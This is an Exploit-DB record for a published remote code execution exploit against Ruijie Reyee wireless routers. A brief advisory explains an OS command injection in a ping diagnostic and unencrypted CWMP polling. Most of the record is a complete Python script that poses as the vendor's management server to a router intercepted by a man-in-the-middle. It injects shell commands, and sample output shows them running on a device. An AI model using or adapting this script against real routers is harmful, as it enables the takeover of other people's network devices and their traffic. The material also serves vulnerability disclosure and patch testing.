{"source": "https://www.exploit-db.com/exploits/51727", "vulnName": "Ruijie Reyee Mesh Router - MITM Remote Code Execution (RCE)", "vulnEDBID": "51727", "vulnCVE": "N/A", "author": "RIYAN FIRMANSYAH OF SECLAB", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2023-10-09", "vulnContent": "# Exploit Title: Ruijie Reyee Wireless Router firmware version B11P204 - MITM Remote Code Execution (RCE)\n# Date: April 15, 2023\n# Exploit Author: Mochammad Riyan Firmansyah of SecLab Indonesia\n# Vendor Homepage: https://ruijienetworks.com\n# Software Link: https://www.ruijienetworks.com/support/documents/slide_EW1200G-PRO-Firmware-B11P204\n# Version: ReyeeOS 1.204.1614; EW_3.0(1)B11P204, Release(10161400)\n# Tested on: Ruijie RG-EW1200, Ruijie RG-EW1200G PRO\n\n\"\"\"\nSummary\n=======\nThe Ruijie Reyee Cloud Web Controller allows the user to use a diagnostic tool which includes a ping check to ensure connection to the intended network, but the ip address input form is not validated properly and allows the user to perform OS command injection.\nIn other side, Ruijie Reyee Cloud based Device will make polling request to Ruijie Reyee CWMP server to ask if there's any command from web controller need to be executed. After analyze the network capture that come from the device, the connection for pooling request to Ruijie Reyee CWMP server is unencrypted HTTP request.\nBecause of unencrypted HTTP request that come from Ruijie Reyee Cloud based Device, attacker could make fake server using Man-in-The-Middle (MiTM) attack and send arbitrary commands to execute on the cloud based device that make CWMP request to fake server.\nOnce the attacker have gained access, they can execute arbitrary commands on the system or application, potentially compromising sensitive data, installing malware, or taking control of the system.\n\nThis advisory has also been published at https://github.com/ruzfi/advisory/tree/main/ruijie-wireless-router-mitm-rce.\n\"\"\"\n\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nfrom html import escape, unescape\nimport http.server\nimport socketserver\nimport io\nimport time\nimport re\nimport argparse\nimport gzip\n\n# command payload\ncommand = \"uname -a\"\n\n# change this to serve on a different port\nPORT = 8080\n\ndef cwmp_inform(soap):\n    cwmp_id = re.search(r\"(?:<cwmp:ID.*?>)(.*?)(?:<\\/cwmp:ID>)\", soap).group(1)\n    product_class = re.search(r\"(?:<ProductClass.*?>)(.*?)(?:<\\/ProductClass>)\", soap).group(1)\n    serial_number = re.search(r\"(?:<SerialNumber.*?>)(.*?)(?:<\\/SerialNumber>)\", soap).group(1)\n    result = {'cwmp_id': cwmp_id, 'product_class': product_class, 'serial_number': serial_number, 'parameters': {}}\n    parameters = re.findall(r\"(?:<P>)(.*?)(?:<\\/P>)\", soap)\n    for parameter in parameters:\n        parameter_name = re.search(r\"(?:<N>)(.*?)(?:<\\/N>)\", parameter).group(1)\n        parameter_value = re.search(r\"(?:<V>)(.*?)(?:<\\/V>)\", parameter).group(1)\n        result['parameters'][parameter_name] = parameter_value\n    return result\n\ndef cwmp_inform_response():\n    return \"\"\"<?xml version='1.0' encoding='UTF-8'?>\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:cwmp=\"urn:dslforum-org:cwmp-1-0\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><SOAP-ENV:Header><cwmp:ID SOAP-ENV:mustUnderstand=\"1\">16</cwmp:ID><cwmp:NoMoreRequests>1</cwmp:NoMoreRequests></SOAP-ENV:Header><SOAP-ENV:Body><cwmp:InformResponse><MaxEnvelopes>1</MaxEnvelopes></cwmp:InformResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>\"\"\"\n\ndef command_payload(command):\n    current_time = time.time()\n    result = \"\"\"<?xml version='1.0' encoding='UTF-8'?>\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:cwmp=\"urn:dslforum-org:cwmp-1-0\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><SOAP-ENV:Header><cwmp:ID SOAP-ENV:mustUnderstand=\"1\">ID:intrnl.unset.id.X_RUIJIE_COM_CN_ExecuteCliCommand{cur_time}</cwmp:ID><cwmp:NoMoreRequests>1</cwmp:NoMoreRequests></SOAP-ENV:Header><SOAP-ENV:Body><cwmp:X_RUIJIE_COM_CN_ExecuteCliCommand><Mode>config</Mode><CommandList SOAP-ENC:arrayType=\"xsd:string[1]\"><Command>{command}</Command></CommandList></cwmp:X_RUIJIE_COM_CN_ExecuteCliCommand></SOAP-ENV:Body></SOAP-ENV:Envelope>\"\"\".format(cur_time=current_time, command=command)\n    return result\n\ndef command_response(soap):\n    cwmp_id = re.search(r\"(?:<cwmp:ID.*?>)(.*?)(?:<\\/cwmp:ID>)\", soap).group(1)\n    command = re.search(r\"(?:<Command>)(.*?)(?:<\\/Command>)\", soap).group(1)\n    response = re.search(r\"(?:<Response>)((\\n|.)*?)(?:<\\/Response>)\", soap).group(1)\n    result = {'cwmp_id': cwmp_id, 'command': command, 'response': response}\n    return result\n\nclass CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):\n    protocol_version = 'HTTP/1.1'\n    def do_GET(self):\n        self.send_response(204)\n        self.end_headers()\n\n    def do_POST(self):        \n        print(\"[*] Got hit by\", self.client_address)\n\n        f = io.BytesIO()\n        if 'service' in self.path:\n            stage, info = self.parse_stage()\n            if stage == \"cwmp_inform\":\n                self.send_response(200)\n                print(\"[!] Got Device information\", self.client_address)\n                print(\"[*] Product Class:\", info['product_class'])\n                print(\"[*] Serial Number:\", info['serial_number'])\n                print(\"[*] MAC Address:\", info['parameters']['mac'])\n                print(\"[*] STUN Client IP:\", info['parameters']['stunclientip'])\n                payload = bytes(cwmp_inform_response(), 'utf-8')\n                f.write(payload)\n                self.send_header(\"Content-Length\", str(f.tell()))\n            elif stage == \"command_request\":\n                self.send_response(200)\n                self.send_header(\"Set-Cookie\", \"JSESSIONID=6563DF85A6C6828915385C5CDCF4B5F5; Path=/service; HttpOnly\")\n                print(\"[*] Device interacting\", self.client_address)\n                print(info)\n                payload = bytes(command_payload(escape(\"ping -c 4 127.0.0.1 && {}\".format(command))), 'utf-8')\n                f.write(payload)\n                self.send_header(\"Content-Length\", str(f.tell()))\n            else:\n                print(\"[*] Command response\", self.client_address)\n                print(unescape(info['response']))\n                self.send_response(204)\n                f.write(b\"\")\n        else:\n            print(\"[x] Received invalid request\", self.client_address)\n            self.send_response(204)\n            f.write(b\"\")\n\n        f.seek(0)\n        self.send_header(\"Connection\", \"keep-alive\")\n        self.send_header(\"Content-type\", \"text/xml;charset=utf-8\")\n        self.end_headers()\n        if f:\n            self.copyfile(f, self.wfile)\n            f.close()\n\n    def parse_stage(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = gzip.decompress(self.rfile.read(content_length))\n        if \"cwmp:Inform\" in post_data.decode(\"utf-8\"):\n            return (\"cwmp_inform\", cwmp_inform(post_data.decode(\"utf-8\")))\n        elif \"cwmp:X_RUIJIE_COM_CN_ExecuteCliCommandResponse\" in post_data.decode(\"utf-8\"):\n            return (\"command_response\", command_response(post_data.decode(\"utf-8\")))\n        else:\n            return (\"command_request\", \"Ping!\")\n        \n    def log_message(self, format, *args):\n        return\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--bind', '-b', default='', metavar='ADDRESS',\n                        help='Specify alternate bind address '\n                             '[default: all interfaces]')\n    parser.add_argument('port', action='store',\n                        default=PORT, type=int,\n                        nargs='?',\n                        help='Specify alternate port [default: {}]'.format(PORT))\n    args = parser.parse_args()\n\n    Handler = CustomHTTPRequestHandler\n    with socketserver.TCPServer((args.bind, args.port), Handler) as httpd:\n        ip_addr = args.bind if args.bind != '' else '0.0.0.0'\n        print(\"[!] serving fake CWMP server at {}:{}\".format(ip_addr, args.port))\n        try:\n            httpd.serve_forever()\n        except KeyboardInterrupt:\n            pass\n        httpd.server_close()\n\n\n\"\"\"\nOutput\n======\nubuntu:~$ python3 exploit.py\n[!] serving fake CWMP server at 0.0.0.0:8080\n[*] Got hit by ('[redacted]', [redacted])\n[!] Got Device information ('[redacted]', [redacted])\n[*] Product Class: EW1200G-PRO\n[*] Serial Number: [redacted]\n[*] MAC Address: [redacted]\n[*] STUN Client IP: [redacted]:[redacted]\n[*] Got hit by ('[redacted]', [redacted])\n[*] Device interacting ('[redacted]', [redacted])\nPing!\n[*] Got hit by ('[redacted]', [redacted])\n[*] Command response ('[redacted]', [redacted])\nPING 127.0.0.1 (127.0.0.1): 56 data bytes\n64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.400 ms\n64 bytes from 127.0.0.1: seq=1 ttl=64 time=0.320 ms\n64 bytes from 127.0.0.1: seq=2 ttl=64 time=0.320 ms\n64 bytes from 127.0.0.1: seq=3 ttl=64 time=0.300 ms\n\n--- 127.0.0.1 ping statistics ---\n4 packets transmitted, 4 packets received, 0% packet loss\nround-trip min/avg/max = 0.300/0.335/0.400 ms\nLinux Ruijie 3.10.108 #1 SMP Fri Apr 14 00:39:29 UTC 2023 mips GNU/Linux\n\n\"\"\"\n            "}